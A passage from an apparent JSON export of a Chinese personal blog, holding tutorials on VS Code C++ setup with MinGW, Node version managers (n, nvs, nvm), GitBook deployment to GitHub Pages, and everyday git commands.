&quot;C:/mingw64/bin/g++.exe&quot;,//根据个人安装位置修改 &quot;cStandard&quot;: &quot;c17&quot;, &quot;cppStandard&quot;: &quot;c++17&quot;, &quot;intelliSenseMode&quot;: &quot;$&#123;default&#125;&quot; &#125; ], &quot;version&quot;: 4&#125; 创建tasks.json创建构建任务，即创建一个tasks.json文件来告诉VS Code如何构建（编译）程序。该任务将调用g ++编译器以基于源代码创建可执行文件。 任务：配置默认生成任务”（Configure Default Build Task)。在下拉列表中，选择```使用模板创建Tasks.json文件```，然后选择```Others```。VS Code创建一个最小tasks.json文件，并在编辑器中将其打开。1234567891011121314151617181920212223使用以下代码片段替换整个文件内容：```json&#123; &quot;version&quot;: &quot;2.0.0&quot;, &quot;tasks&quot;: [ &#123; &quot;label&quot;: &quot;build hello world&quot;,//这里可以随意命名 &quot;type&quot;: &quot;shell&quot;, &quot;command&quot;: &quot;g++&quot;, &quot;args&quot;: [ &quot;-g&quot;, &quot;-o&quot;, &quot;HelloWorld&quot;, &quot;HelloWorld.cpp&quot; ], &quot;group&quot;: &#123; &quot;kind&quot;: &quot;build&quot;, &quot;isDefault&quot;: true &#125; &#125; ]&#125; 配置调试设置配置VS Code以在按F5键时启动GCC调试器（gdb.exe）。首次调试.cpp代码时，会弹出选择环境的下拉菜单。选择GDB &#x2F; LLDB环境。选择“g++.exe-生成和调试活动文件”。vs code会自动打开launch.json文件。 123456789101112131415161718192021222324252627282930&#123; // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;name&quot;: &quot;g++.exe - 生成和调试活动文件&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;C:/VS-Code-C/workspace/HelloWorld/HelloWorld.exe&quot;,//按照个人工作区名字配置 &quot;args&quot;: [], &quot;stopAtEntry&quot;: true, //&quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;, &quot;cwd&quot;: &quot;C:/mingw64/bin&quot;, &quot;environment&quot;: [], &quot;externalConsole&quot;: true, &quot;MIMode&quot;: &quot;gdb&quot;, &quot;miDebuggerPath&quot;: &quot;C:\\\\mingw64\\\\bin\\\\gdb.exe&quot;,//按照个人路径配置 &quot;setupCommands&quot;: [ &#123; &quot;description&quot;: &quot;为gdb启用整齐打印&quot;, &quot;text&quot;: &quot;-enable-pretty-printing&quot;, &quot;ignoreFailures&quot;: true &#125; ], &quot;preLaunchTask&quot;: &quot;C/C++: g++.exe 生成活动文件&quot; &#125; ] &#125; VS Code现在已配置为使用Mingw-w64。该配置适用于当前工作空间。要重用配置，只需将三个JSON文件复制到新工作区中的.vscode子文件夹，然后根据需要更改源文件和可执行文件的名称。 运行HelloWorld.cpp运行结束后，打开工作区，可以看到新生成了一些文件： 如果你在workspace下再次创建一个Hello文件夹，并在它下面写c++文件，会导致程序无法运行，因为我们配置的工作区为workspace，而在其下面的文件夹里的文件无法生成.exe文件，导致程序 运行报错[errror]Id returned 1 exit status。因此我们最好在workspace下直接创建c++文件。","categories":[{"name":"C++","slug":"C","permalink":"https://avalooooooon.github.io/categories/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://avalooooooon.github.io/tags/C/"}]},{"title":"node版本管理（macOS和windows）","slug":"node版本管理（macOS）","date":"2021-12-26T07:53:53.000Z","updated":"2021-12-26T07:53:53.000Z","comments":true,"path":"2021/12/26/node版本管理（macOS）/","link":"","permalink":"https://avalooooooon.github.io/2021/12/26/node%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%EF%BC%88macOS%EF%BC%89/","excerpt":"","text":"安装的npm全局模块不会在各个版本的node.js之间共享。还有可能有些npm包不支持当前使用的node版本 不要使用单数的node版本！ macOS：使用 n 版本管理工具检查node及npm环境12node -vnpm -v 安装node版本管理模块n12sudo npm i -g n n -V 安装和切换node版本可能要求权限，在命令前加sudo即可。 1234567891011121314# 列出所有node版本n ls # 安装某个版本n xx.xx.x (版本号)# 切换node版本(通过上下键盘加回车选择)n# 删除某个版本n rm xx.xx.x# 使用某个版本来运行脚本n use xx.xx.x a.js Windows&#x2F;macOS：使用 nvs 版本管理工具安装nvs nvs的设置参考官方说明 在nvs&#x2F;releases 下载最新版本的 nvs.msi，双击安装。添加环境变量： 1NVS_HOME=%LOCALAPPDATA%\\nvs 下面是一些基本命令。 12345678# 初始化并使用 NVSnvs install # 从 profile 和 environment 中移除 NVSnvs uninstall # 展示 NVS 版本nvs --version 如果想要把lts设置为系统默认的node版本： 1nvs link lts 注意，nvs use 是改变当前shell窗口的node版本，不是全局环境（nvm的区别）；nvs link是改变全局环境的node版本。 配置镜像地址国内需要把对应的镜像地址修改为淘宝的镜像地址。 12nvs remote node https://npm.taobao.org/mirrors/node/nvs remote nvs remote命令允许配置多个命名的下载位置。NVS 分别管理来自不同远程位置的版本，因此没有版本冲突的风险。默认情况下，只有一个远程指向 Node.js 官方版本： 123$ nvs remotedefault nodenode https://npm.taobao.org/mirrors/node/ 这样就可以从其他来源获得构建。以下命令为 nightly 添加了一个远程 remote，列出了 nightly ，并添加了一个构建： 12345$ nvs remote add nightly https://nodejs.org/download/nightly/$ nvs lsr nightly/13nightly/13.1.1-nightly20191120c7c566023f...$ nvs add nightly/13 安装和切换node版本12345678910111213141516171819# 展示本地的Node.js列表nvs ls [filter] # 切换Node版本nvs use node/[version]/x64# 更新当前环境的 Node.js 至最新版本nvs upgrade [fromver]# 列出可下载的 Node.js 版本nvs ls-remote [filter]nvs lsr [filter]# 下载某个版本的 Node.jsnvs add [version] # 移除某个版本的 Node.jsnvs rm &lt;version&gt; 根据目录自动切换版本在 Bash 或 PowerShell 中，NVS 可以在更改目录时自动切换当前 Shell 中的 Node.js 版本。默认情况下，此功能处于禁用状态。使它运行nvs auto on。之后，无论何时cd或pushd在包含.node-version或.nvmrc文件的目录下，NVS 都会相应地自动切换 Node.js 版本，并在必要时下载新版本。当您cd到达目录上方没有目录.node-version或.nvmrc文件的目录时，将还原默认（链接）版本（如果有）。 Windows 命令提示符中不提供此功能。请用 PowerShell。 1234567891011~$ nvs link 6.9.1~/.nvs/default -&gt; ~/.nvs/node/6.9.1/x64~$ nvs usePATH += ~/.nvs/default/bin~$ nvs auto on~$ cd myprojectPATH -= ~/.nvs/default/binPATH += ~/.nvs/node/4.6.1/x64/bin~/myproject$ cd ..PATH -= ~/.nvs/node/4.6.1/x64/binPATH += ~/.nvs/default/bin 如果您的外壳与自动切换不兼容，或者您 ​​ 希望手动切换但仍利用其中的任何一个.node-versionor.nvmrc文件，则可以nvs use auto使用该版本运行，也可以直接运行nvs auto。 1nvs use auto 或 nvs auto VS Code 支持nvs 这部分参考官方说明 VS Code可以使用 NVS 选择启动或调试时要使用的 Node.js 版本。在launch.json（位于项目根目录的.vscode文件夹中）添加一个“runtimeArgs”属性，该属性包含一个NVS可识别的版本字符串，以及一个“runtimeExecutable”属性，该属性指向nvs.cmd（Windows）或nvs（Mac, Linux）。对于多平台开发，可以为每个平台自定义配置。如果 NVS 不在 VS Code 的 PATH 环境变量中，则可能需要指定一个绝对路径，例如”${env:HOME}&#x2F;.nvs&#x2F;nvs”)配置示例：配置launch.json，以便VS Code使用NVS启动节点版本6.10： 12345678910111213&quot;configurations&quot;: [ &#123; &quot;type&quot;: &quot;node&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;name&quot;: &quot;Launch Program&quot;, &quot;program&quot;: &quot;$&#123;file&#125;&quot;, &quot;args&quot;: [ ], &quot;runtimeArgs&quot;: [ &quot;6.10&quot; ], &quot;windows&quot;: &#123; &quot;runtimeExecutable&quot;: &quot;nvs.cmd&quot; &#125;, &quot;osx&quot;: &#123; &quot;runtimeExecutable&quot;: &quot;nvs&quot; &#125;, &quot;linux&quot;: &#123; &quot;runtimeExecutable&quot;: &quot;nvs&quot; &#125; &#125;,] “runtimeArgs”中的NVS版本字符串值由完整或部分语义版本号或版本标签（“lts”、“latest”、“Argon”等）组成，可选前跟远程名称，可选后跟处理器架构或位数（“x86”、“x64”、“32”、“64”），用斜杠分隔。当部分版本与多个可用版本匹配时，会自动选择最新版本。示例：“节点&#x2F;lts”、“4.6.0”、“6&#x2F;x86”、“节点&#x2F;6.7&#x2F;x64”。NVS别名也可以代替版本字符串。 或者”runtimeArgs”中的版本字符串可能会被省略（相当于“auto”），在这种情况下，NVS搜索项目目录或父目录中最近的.node-version文件。如果找到，则下载（如有必要）并启动文件中指定的版本。如果没有找到.node-version文件，则将启动默认（链接）版本（如果有的话）。 当不将自动模式与.node-version文件一起使用时，launch.json中指定的节点版本必须已经使用nvs add命令下载。否则，启动将失败，NVS打印错误信息“未找到指定版本”。 有关更多详细信息，请参见NVS VS Code文档。或者执行命令nvs help vscode。 Windows：使用 nvm 版本管理工具查看nvm版本1nvm version 安装和切换node版本1234567891011121314151617# 列出所有node版本。* 代表当前版本。末尾输入 available 显示可供下载的所有版本列表。nvm list [available]# 安装某个版本。version：版本号 例如 8.9.0 或者 latest（最新稳定版）,[arch]可选、指定是否安装32位或64位版本（默认为系统架构），将[arch]设置为 all 安装32和64位版本。nvm install &lt;version&gt; [arch]# 切换node版本。可选[arch]32和64位版本nvm use &lt;version&gt; [arch]# 卸载指定的node版本nvm uninstall &lt;version&gt;# 设置nvm存放不同版本的node.js的目录。 如果没有设置 path ，则显示当前的根目录nvm root &lt;path&gt;# 设置node是以32还是64位模式运行。 指定32或64来覆盖默认操作系统版本。nvm arch [32|64]","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"node","slug":"node","permalink":"https://avalooooooon.github.io/tags/node/"}]},{"title":"gitbook使用教程","slug":"gitbook使用教程","date":"2021-12-26T06:39:24.000Z","updated":"2021-12-27T04:34:54.000Z","comments":true,"path":"2021/12/26/gitbook使用教程/","link":"","permalink":"https://avalooooooon.github.io/2021/12/26/gitbook%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","excerpt":"","text":"参考了这篇文章 检查node环境1node -v 安装gitbook环境安装gitbook-cli工具gitbook-cli是一个在同一系统上安装和使用多个版本的GitBook的实用程序。它将自动安装所需版本的GitBook来构建一本书。打开终端输入npm install gitbook-cli -g进行全局安装： 12npm install gitbook-cli -g gitbook --version 可能遇到的问题:TypeError: cb.apply is not a function解决方案：降低node版本。10.xx.xx是可行的。 Gitbook使用初始化一本书（笔记文件夹）在想要的位置创建一个项目目录，cd到该目录，执行 1gitbook init 可以看到该目录下出现了README.md和SUMMARY.md两个文件。 编辑目录如果SUMMARY.md文件有已经编辑好的目录，gitbook init时会根据目录内容创建文件。下面是SUMMARY.md的一个实例： 12345678* [Introduction](README.md)* [第一章](part1/README.md) * [1.1](part1/1.md) * [1.2](part1/2.md) * [1.2.1](part1/2/1.md)* [第二章](part2/README.md) * [2.1](part2/1.md)* [第三章](part3/README.md) 它生成的文件结构如下： 写笔记根据喜好选择编辑器即可。 启动gitbook服务1gitbook serve 启动服务后，项目文件夹中会生成一个_book文件夹，此文件夹就是最终生成的项目。 生成电子书浏览器打开地址” http://localhost:4000&quot;即可预览。 部署到github首先在项目中创建一个.gitignore文件（和README.md、SUMMARY.md）同级，内容如下： 12# 忽略gitbook生成的项目目录_book 此外，由于gitbook生成的项目跟文档的源码是两个部分，所以可以把文档放到master分支上，部署的网站放到gh-pages 分支。 在github上创建一个仓库自行创建即可。 本地项目提交到github仓库12345git initgit add .git commit -m # 初始化gitbook本地项目&#x27;git remote add origin &lt;git仓库地址&gt;git push -u origin main # 推送到远程仓库的main分支 生成项目并上传到github仓库的gh-pages分支由于打包命令太多，为了简单化，现在写一个脚本命令来自动执行。当然你也可以终端自己执行这些命令。 为了部署方便，可以创建一个脚本文件deploy.sh,内容如下： 123456789101112131415161718192021222324252627282930#!/usr/bin/env shecho &#x27;开始执行命令&#x27;# 生成静态文件echo &#x27;执行命令：gitbook build .&#x27;gitbook build .# 进入生成的文件夹echo &quot;执行命令：cd ./_book\\n&quot;cd ./_book# 初始化一个仓库，仅仅是做了一个初始化的操作，项目里的文件还没有被跟踪echo &quot;执行命令：git init\\n&quot;git init# 保存所有的修改echo &quot;执行命令：git add -A&quot;git add -A# 把修改的文件提交echo &quot;执行命令：commit -m &#x27;deploy&#x27;&quot;git commit -m &#x27;deploy&#x27;# 如果发布到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;echo &quot;执行命令：git push -f git@github.com:Avalooooooon/ING_leetcode_2201.git head:gh-pages&quot;git push -f git@github.com:Avalooooooon/ING_leetcode_2201.git head:gh-pages# 返回到上一次的工作目录echo &quot;回到刚才工作目录&quot;cd - 注意脚本文件代码中仓库地址要替换成你自己的地址。文件保存后，在终端执行如下命令，把生成的项目推送到github仓库上的gh-pages分支： 123bash deploy.sh # macos# windows中，确保已经安装了git工具后直接双击deploy.sh即可运行 执行成功后，打开你的github仓库，然后选择branch分支，会发现多了一个gh-pages分支，打开这个分之后，里面会有一个index.html文件。说明部署的代码上传成功了。注意：如果没有gh-pages分支说明没有部署成功请查看刚才执行的终端看哪里报错了，解决报错直到成功部署。 配置GitHub Pages显示网站在github网站上的仓库里面点击Settings -&gt; GitHub Pages选项中 -&gt; Source里面选择gh-pages branch 然后点击Save按钮，然后在GitHub Pages下面就会看见一个网址，这个网址就是最终的网站。 gitbook多终端使用需要一台已经配置好gitbook环境且有完整gitbook文件夹的终端作为条件。在另一台设备上，git clone仓库的master分支，运行deploy.sh文件。 在Windows端，如果出现报错”Error:ENOENT:no such file or directory, stat ‘C:\\Users\\Lenovo\\www\\mdspg\\md\\mybook_book\\gitbook\\gitbook-plugin-fontsettings\\fontsettings.js’”，在C:\\Users\\username.gitbook\\versions\\3.2.3\\lib\\output\\website\\copyPluginAssets.js，将confirm:true全部替换为confirm:false。共两处。 多终端发布不论是在哪台终端，修改了书籍文件后按下列步骤进行操作： git pull origin main，先pull完成本地与远端的融合 修改书籍内容 git add - A ，添加本地所有文件到仓库 git commit -m 修改说明，提交修改； git push origin main，更新至main分支； 运行deploy.sh文件，生成项目并上传到github仓库的gh-pages分支； gitbook serve，启动gitbook服务。启动服务后，项目文件夹中会生成一个_book文件夹，此文件夹就是最终生成的项目。 gitbook的配置文件讲解如果想对你的网站有更详细的个性化配置或使用插件，那么需要使用配置文件。配置文件写完后，需要重启服务或者重新打包才能应用配置。gitbook的配置文件名是book.json，首先在项目的根目录中创建book.json文件。book.json主要内容： 123456789101112131415161718192021222324252627282930313233&#123; &quot;title&quot;: &quot;我的一本书&quot;, &quot;author&quot; : &quot;yu&quot;, &quot;description&quot; : &quot;我第一本书的描述，很好&quot;, &quot;language&quot; : &quot;zh-hans&quot;, &quot;structure&quot;: &#123; &quot;readme&quot;: &quot;introduction.md&quot; &#125;, &quot;plugins&quot;: [ &quot;-lunr&quot;, &quot;-search&quot;, &quot;search-pro&quot;, &quot;back-to-top-button&quot; ], &quot;pluginsConfig&quot;: &#123; &quot;anchor-navigation-ex&quot;: &#123; &quot;isShowTocTitleIcon&quot;: true &#125; &#125;, &quot;links&quot; : &#123; &quot;sidebar&quot; : &#123; &quot;个性链接1&quot; : &quot;https://www.baidu.com&quot;, &quot;个性链接2&quot; : &quot;https://www.baidu.com&quot; &#125; &#125;, &quot;styles&quot;: &#123; &quot;website&quot;: &quot;styles/website.css&quot;, &quot;ebook&quot;: &quot;styles/ebook.css&quot;, &quot;pdf&quot;: &quot;styles/pdf.css&quot;, &quot;mobi&quot;: &quot;styles/mobi.css&quot;, &quot;epub&quot;: &quot;styles/epub.css&quot; &#125;&#125; book.json中一些主要参数说明 title：标题 author：作者 description：描述，对应gitbook网站的description language：使用的语言，zh-hans是简体中文，会对应到页面的&lt;html lang&#x3D;”zh-hans” &gt; structure：指定 Readme、Summary、Glossary 和 Languages 对应的文件名，下面是这几个文件对应变量以及默认值： Variable Description structure.readme Readme file name (defaults to README.md) structure.summary Summary file name (defaults to SUMMARY.md) structure.glossary Glossary file name (defaults to GLOSSARY.md) structure.languages Languages file name (defaults to LANGS.md) 比如想把readme文件换个名字，则可以使用如下配置 123&quot;structure&quot;: &#123; &quot;readme&quot;: &quot;introduction.md&quot;&#125;, 使用这个配置后，gitbook服务就不会找readme文件，而去找introduction文件当项目说明，这样就可以把readme文件完全当成代码仓库说明文档了。 plugins：使用的插件列表，所有的插件都在这里写出来，然后使用gitbook install来安装。 pluginsConfig：插件的配置信息，如果插件需要配置参数，那么在这里填写。 links：目前可以给侧导航栏添加链接信息12345&quot;links&quot; : &#123; &quot;sidebar&quot; : &#123; &quot;个性链接1&quot; : &quot;https://www.baidu.com&quot; &#125;&#125; styles：自定义页面样式，各种格式对应各自的css文件1234567&quot;styles&quot;: &#123; &quot;website&quot;: &quot;styles/website.css&quot;, &quot;ebook&quot;: &quot;styles/ebook.css&quot;, &quot;pdf&quot;: &quot;styles/pdf.css&quot;, &quot;mobi&quot;: &quot;styles/mobi.css&quot;, &quot;epub&quot;: &quot;styles/epub.css&quot;&#125; 配置默认主题默认的主题可以通过配置来做一下效果。比如侧边栏菜单显示标题数字，可以在配置文件的pluginsConfig参数中写入如下字段： 1234567&#123; &quot;pluginsConfig&quot;: &#123; &quot;theme-default&quot;: &#123; &quot;showLevel&quot;: true &#125; &#125;&#125; 效果如图： gitbook的一些实用插件 gitbook插件可以解决一些网站不太方便的地方，如侧边栏导航不能收缩，自带搜索不支持中文等。用了插件书籍网站会更灵活和美观。 由于插件很多，请参考另一篇文章：https://segmentfault.com/a/1190000019806829","categories":[{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/tags/git/"}]},{"title":"git笔记","slug":"git笔记","date":"2021-12-20T07:40:59.000Z","updated":"2021-12-20T07:40:59.000Z","comments":true,"path":"2021/12/20/git笔记/","link":"","permalink":"https://avalooooooon.github.io/2021/12/20/git%E7%AC%94%E8%AE%B0/","excerpt":"","text":"查看完整教程：Git-scm 查看版本&#x2F;日志123# 项目所在目录git log：查看提交日志（查看版本号）git log git reflog # 查看版本号 不传入任何参数的默认情况下，git log 会按时间先后顺序列出所有的提交，最近的更新排在最上面。git log 有许多选项可以帮助你搜寻你所要找的提交，下面是最常用的几个： -p 或 &#96;&#96;–patch&#96; ：显示每次提交所引入的差异（按补丁的格式输出） -&lt;n&gt; :仅显示最近的 n 条提交。 --since 和 --until ：按照时间作限制。12# 列出最近两周的所有提交$ git log --since=2.weeks 该命令可用的格式十分丰富——可以是类似 &quot;2008-01-15&quot; 的具体的某一天，也可以是类似 &quot;2 years 1 day 3 minutes ago&quot; 的相对日期。 --author : 指定作者 --grep : 搜索提交说明中的关键字 --stat：显示每次提交的简略统计信息。--stat 选项在每次提交的下面列出所有被修改过的文件、有多少文件被修改了以及被修改过的文件的哪些行被移除或是添加了。 在每次提交的最后还有一个总结。 --pretty：使用不同于默认格式的方式展示提交历史。 这个选项有一些内建的子选项供你使用。 比如 oneline 会将每个提交放在一行显示，在浏览大量的提交时非常有用。 当 oneline 或 format 与另一个 log 选项 --graph 结合使用时尤其有用。 这个选项添加了一些 ASCII 字符串来形象地展示你的分支、合并历史。 另外还有 short，full 和 fuller 选项，它们展示信息的格式基本一致，但是详尽程度不一。 format ：可以定制记录的显示格式。 这样的输出对后期提取分析格外有用——因为你知道输出的格式不会随着 Git 的更新而发生改变： 1234$ git log --pretty=format:&quot;%h - %an, %ar : %s&quot;ca82a6d - Scott Chacon, 6 years ago : changed the version number085bb3b - Scott Chacon, 6 years ago : removed unnecessary testa11bef0 - Scott Chacon, 6 years ago : first commit git log --pretty=format 常用的选项 列出了 format 接受的常用格式占位符的写法及其代表的意义。 更详细的选项说明可以参考git log 的常用选项 。 文件文件状态1234# 查看当前分支、分支同远程分支的比较、哪些文件处于什么状态git status# 开始跟踪一个文件/将一个文件放到暂存区、git add 文件名 未跟踪的文件意味着 Git 在之前的快照（提交）中没有这些文件；Git 不会自动将之纳入跟踪范围，除非你明明白白地告诉它“我需要跟踪该文件”。 这样的处理让你不必担心将生成的二进制文件或其它不想被跟踪的文件包含进来。 git add 是个多功能命令：可以用它开始跟踪新文件，也可以用它把已跟踪的文件放到暂存区，还能用于合并时把有冲突的文件标记为已解决状态等。 将这个命令理解为“精确地将内容添加到下一次提交中”而不是“将一个文件添加到项目中”要更加合适。 注意！运行了 git add 之后又作了修订的文件，需要重新运行 git add 把最新版本重新暂存起来。 如果想缩短状态命令的输出： 12git status -s git status --short 新添加的未跟踪文件前面有 ?? 标记，新添加到暂存区中的文件前面有 A 标记，修改过的文件前面有 M 标记。 输出中有两栏，左栏指明了暂存区的状态，右栏指明了工作区的状态。 示例： 123456$ git status -sM READMEMM RakefileA lib/git.rbM lib/simplegit.rb?? LICENSE.txt README 文件在工作区已修改但尚未暂存，而 lib/simplegit.rb 文件已修改且已暂存。 Rakefile文件已修，暂存后又作了修改，因此该文件的修改中既有已暂存的部分，又有未暂存的部分。 文件的忽略总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。 通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。 在这种情况下可以创建一个名为 .gitignore 的文件，列出要忽略的文件的模式。 123$ cat .gitignore*.[oa]*~ 第一行告诉 Git 忽略所有以 .o 或 .a 结尾的文件。一般这类对象文件和存档文件都是编译过程中出现的。 第二行告诉 Git 忽略所有名字以波浪符（~）结尾的文件，许多文本编辑软件（比如 Emacs）都用这样的文件名保存副本。 此外，你可能还需要忽略 log，tmp 或者 pid 目录，以及自动生成的文档等等。 要养成一开始就为你的新仓库设置好 .gitignore 文件的习惯，以免将来误提交这类无用的文件。 文件 .gitignore 的格式规范如下： 所有空行或者以 # 开头的行都会被 Git 忽略。 可以使用标准的 glob 模式匹配，它会递归地应用在整个工作区中。 匹配模式可以以（/）开头防止递归。 匹配模式可以以（/）结尾指定目录。 要忽略指定模式以外的文件或目录，可以在模式前加上叹号（!）取反。 所谓的 glob 模式是指 shell 所使用的简化了的正则表达式。 星号（*）匹配零个或多个任意字符；[abc]匹配任何一个列在方括号中的字符 （这个例子要么匹配一个 a，要么匹配一个 b，要么匹配一个 c）； 问号（?）只匹配一个任意字符；如果在方括号中使用短划线分隔两个字符， 表示所有在这两个字符范围内的都可以匹配（比如 [0-9] 表示匹配所有 0 到 9 的数字）。 使用两个星号（**）表示匹配任意中间目录，比如 a/**/z 可以匹配 a/z 、 a/b/z 或 a/b/c/z 等。 再看一个 .gitignore 文件的例子： 123456789101112# 忽略所有的 .a 文件*.a# 但跟踪所有的 lib.a，即便你在前面忽略了 .a 文件!lib.a# 只忽略当前目录下的 TODO 文件，而不忽略 subdir/TODO/TODO# 忽略任何目录下名为 build 的文件夹build/# 忽略 doc/notes.txt，但不忽略 doc/server/arch.txtdoc/*.txt# 忽略 doc/ 目录及其所有子目录下的 .pdf 文件doc/**/*.pdf 仓库将尚未进行版本控制的本地目录转换为 Git 仓库先cd到该项目目录，然后 1git init 该命令将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。 请记住，工作目录下的每一个文件都不外乎这两种状态：已跟踪 或 未跟踪。 已跟踪的文件是指那些被纳入了版本控制的文件，在上一次快照中有它们的记录，在工作一段时间后， 它们的状态可能是未修改，已修改或已放入暂存区。简而言之，已跟踪的文件就是 Git 已经知道的文件。其它所有文件都属于未跟踪文件。 编辑过某些文件之后，由于自上次提交后你对它们做了修改，Git 将它们标记为已修改文件。 在工作时可以选择性地将这些修改过的文件放入暂存区，然后提交所有已暂存的修改，如此反复。 如果在一个已存在文件的文件夹（而非空文件夹）中进行版本控制，你应该开始追踪这些文件并进行初始提交。 可以通过 git add 命令来指定所需的文件来进行追踪，然后执行 git commit ： 123git add *.cgit add LICENSEgit commit -m &#x27;initial project version&#x27; 从其它服务器克隆一个已存在的 Git 仓库Git 克隆的是该 Git 仓库服务器上的几乎所有数据，而不是仅仅复制完成你的工作所需要文件。 当你执行 git clone 命令的时候，默认配置下远程 Git 仓库中的每一个文件的每一个版本都将被拉取下来。克隆仓库的命令是 git clone 。 比如，要克隆 Git 的链接库 libgit2，可以用下面的命令： 1git clone https://github.com/libgit2/libgit2 这会在当前目录下创建一个名为 “libgit2” 的目录，并在这个目录下初始化一个 .git 文件夹， 从远程仓库拉取下所有数据放入 .git 文件夹，然后从中读取最新版本的文件的拷贝。 1git clone https://github.com/libgit2/libgit2 mylibgit 这会执行与上一条命令相同的操作，但目标目录名变为了 mylibgit。也就是在克隆远程仓库的时候，自定义了本地仓库的名字。 远程仓库1234567891011121314# 查看你已经配置的远程仓库服务器git remote# 指定选项 -v：显示需要读写远程仓库使用的Git保存的简写与其对应的URLgit remote -v# 添加远程仓库，同时指定一个方便使用的简写&lt;shortname&gt;git remote add &lt;shortname&gt; &lt;url&gt;# 查看某个远程仓库。同样会列出远程仓库的 URL 与跟踪分支的信息。git remote show &lt;remote&gt;# 修改一个远程仓库的简写名。这同样也会修改你所有远程跟踪的分支名字。git remote rename# 移除一个远程仓库git remote remove # 或git remote rm。一旦你使用这种方式删除了一个远程仓库，那么所有和这个远程仓库相关的远程跟踪分支以及配置信息也会一起被删除。 origin ——这是 Git 给你克隆的仓库服务器的默认名字。如果使用 clone 命令克隆了一个仓库，命令会自动将其添加为远程仓库并默认以 “origin” 为简写。 拉取、抓取与推送抓取——fetch12# 从远程仓库中获得数据git fetch &lt;remote&gt; 这个命令会访问远程仓库，从中拉取所有你还没有的数据。 执行完成后，你将会拥有那个远程仓库中所有分支的引用，可以随时合并或查看。 必须注意 git fetch 命令只会将数据下载到你的本地仓库——它并不会自动合并或修改你当前的工作。 当准备好时你必须手动将其合并入你的工作。 拉取——pull如果你的当前分支设置了&#x3D;&#x3D;跟踪远程分支&#x3D;&#x3D;，那么可以用 git pull命令来自动抓取后合并该远程分支到当前分支。 这或许是个更加简单舒服的工作流程。默认情况下，git clone 命令会自动设置本地 master 分支跟踪克隆的远程仓库的 master 分支（或其它名字的默认分支）。 运行 git pull 通常会从最初克隆的服务器上抓取数据并自动尝试合并到当前所在的分支。 推送——push1git push &lt;remote&gt; &lt;branch&gt; 只有当你有所克隆服务器的写入权限，并且之前没有人推送过时，这条命令才能生效。 当你和其他人在同一时间克隆，他们先推送到上游然后你再推送到上游，你的推送就会毫无疑问地被拒绝。 你必须先抓取他们的工作并将其合并进你的工作后才能推送。 此外，如果直接使用git push origin xxx,“error: 源引用表达式xxx没有匹配”的问题会在关联的代码库远程分支名称与本地（当前）分支的名称不同时出现。如果不相同，就要用git push origin head:xxx，或者git push origin &lt;当前的本地分支名&gt;:xxx提交代码。 分支概述1234567891011# 查看所有分支及当前所在分支【* 表示当前】git branch# 查看每一个分支的最后一次提交git branch -v# 查看哪些分支已经合并到当前分支。 在这个列表中分支名字前没有 * 号的分支通常可以使用 git branch -d 删除掉，因为已经将它们的工作整合到了另一个分支，所以不会失去任何东西。git branch --merged# 查看所有包含未合并工作的分支。因为它包含了还未合并的工作，尝试使用 git branch -d 命令删除它时会失败。可以使用 -D 选项强制删除它。git branch --no-merged# 例如，尚未合并到 master 分支的有哪些？git branch --no-merged master Git怎么知道当前在哪一个分支上呢？ 很简单，它有一个名为 HEAD 的特殊指针指向当前所在的本地分支（译注：将 HEAD 想象为当前分支的别名）。HEAD 分支随着提交操作自动向前移动。 12345678910111213# 创建一个新的分支。这会在当前所在的提交对象上创建一个指针。# git branch 命令仅仅创建 一个新分支，并不会自动切换到新分支中去。git branch xxx # 创建一个新分支后立即切换过去git checkout -b &lt;newbranchname&gt;# 从当前分支切换到某个分支。HEAD指向切换之后的分支。git checkout xxx # 查看各个分支当前所指的提交对象git log --oneline --decorate# 查看提交历史、各个分支的指向以及项目的分支分叉情况git log --oneline --decorate --graph --all 分支切换会改变你工作目录中的文件!!git 会重置你的工作目录，使其看起来像回到了你在那个分支上最后一次提交的样子。如果 Git 不能干净利落地完成这个任务，它将禁止切换分支。 要留意你的工作目录和暂存区里那些还没有被提交的修改。最好的方法是，在你切换分支之前，保持好一个干净的状态。 12# 删除某个分支【慎重操作】 注意当前不能在iii分支上,跳出之后,再删除git branch -d iii 合并分支——fast-forward当你试图合并两个分支时， 如果顺着一个分支走下去能够到达另一个分支，那么 Git 在合并两者的时候， 只会简单的将指针向前推进（指针右移），因为这种情况下的合并操作没有需要解决的分歧——这就叫做 “快进（fast-forward）”。 合并分支——merge当两个将要合并的分支各自有不同的父提交时发生。比如下面的例子，要合并master和iss53分支：你的开发历史从一个更早的地方开始分叉开来（diverged）。 因为，master 分支所在提交并不是 iss53 分支所在提交的直接祖先，Git 不得不做一些额外的工作。 出现这种情况的时候，Git 会使用两个分支的末端所指的快照（C4 和 C5）以及这两个分支的公共祖先（C2)，做一个简单的三方合并。和之前将分支指针向前推进所不同的是，Git 将此次三方合并的结果做了一个新的快照并且自动创建一个新的提交指向它。 合并分支——rebaserebase（变基） 命令将提交到某一分支上的所有修改都移至另一分支上。考虑之前提到的merge。开发任务分叉到两个不同分支，又各自提交了更新：Merge会把两个分支的最新快照（C3 和 C4）以及二者最近的共同祖先（C2）进行三方合并，合并的结果是生成一个新的快照（并提交)：其实，还有一种方法：你可以提取在 C4 中引入的补丁和修改，然后在 C3 的基础上应用一次。 在这个例子中，你可以检出 experiment 分支，然后将它变基到 master 分支上： 12git 